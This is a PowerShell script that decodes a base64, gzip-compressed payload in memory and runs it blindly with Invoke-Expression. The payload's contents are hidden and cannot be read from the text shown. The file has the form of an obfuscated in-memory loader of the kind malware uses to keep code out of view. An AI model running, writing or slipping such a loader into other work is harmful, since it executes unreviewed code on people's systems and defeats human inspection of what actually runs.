$payload = @'
H4sIAKkX7GgC/5VU3W4aRxS+R+IdTtZIBrm7jp2blgqpjm0c6thG/ChSHTcddg/LiGFmMzuAaevLXlSq+gSt+m55gj5Cz5kFAg5OW19Ys8P5+37m7EGj0YDT
m+tm64KP5VJlIHLsWwUNCEbOZfXDw+PjryKZRamKMrWI0rR+9OLFl0cBwB50MFMiRphLN4KFmVpoK7GQjqIgmw6UjKHfeQ1VbcBZIZXUKeRK5KMadUrFBHPq
8001eCmUcNYEX0Bwigpzh3w8Q5EAfaucvy7QTNDZBZxRPl+8Egnlt1rrsz8YpcwcLrVMRw66Uo1zo9NPfuGLls5ju8icNJo/rzAVA6PHfO7IfAxmCB0hNRzz
TV8RgLFUKqgx8Ktp7mAiXDwCN0L4rtUGoRMY4wKGUqFmaAQxMXOtjEiaRiVoCeu3RuqwLYitCupZvd8977Q7N83W63OCuwzO315welAuySFUn1V7xMcyZ7te
rQY/wTXOw5bDCfj/vUWGcCYtxs4QVTvT4Ge4mbrweqoUPJRL5dKed0H3tNNq96DbO+n0Ci+8sdJh+MoQ1OBkRvKJgULwstVpuqGxUK3IxvOvoSIhVA4KSaNT
M9WOLw8OaMJyCehvsxbcVijv4Kh2B3TwObcVeVejmn6eSjwyklzVIH+JZJl0rh2NzmTr6WRAR+rONLNMfMtl2IIwF9otuVsVCgul9r9/mxxU9tczVaRO8J7a
3Ert7tbBcFT87CsUIQzuOYTUcnWR4hbadc3HWFt6JpRMICdbx2y1KICwaSymlvKSU6OoaAeTj9l4L13x9bAc00NrwJopnuCOuAJUOa7BrKIKGEsqGUOojYMl
zxDGRjtydV4k1HYKxP6DfR+wD5w95Fk/O3kx9dJOJ/R62B30HEhNfhRPSOnfC7PKrYIiuUOPXOIMITaWfVwEWTMhDu0MbbnES2CF2uLEOLzExXJnrfbXoS/5
wztKjtw9G8KH431GJTG59DNVSR0zxvANDjr4fkrvDMK+lY+qhv0cX4pcxm1hc95g4bm1xp54OaHrTFYjExAm7aKelZNqjbWJveV2kNukh4QJOAND5JDVztjE
GJFe1cq76Pw+Rr+goivMc5GSXv9RBG9eLh1q3IK9U/APf/4GLb1BeAQncUwtIUEt8X9Iv1piXt4fZbaxBHcqFFFMwEFEvtTCU7q1Jh/trmAza3tFffjjF2Bd
Rcyk0dDrYVi0Ii+Kgi3/PGWAzZlD2pZNFmhryH93xac0//3X779+ZCg2k0whDQr51JM9pI28eAZdMfP+qG813KHAhUXUn/Ua67ruN/TGq8MTznpK4od/AMCF
TKAlCAAA
'@

try {
    $bytes = [System.Convert]::FromBase64String($payload)
    $ms = New-Object System.IO.MemoryStream(, $bytes)
    $gs = New-Object System.IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object System.IO.StreamReader($gs)
    $script = $sr.ReadToEnd()
    $sr.Close()
    $gs.Close()
    $ms.Close()
    Invoke-Expression $script
} catch {
    Write-Error "Failed to decode or execute payload: $($_.Exception.Message)"
    exit 1
}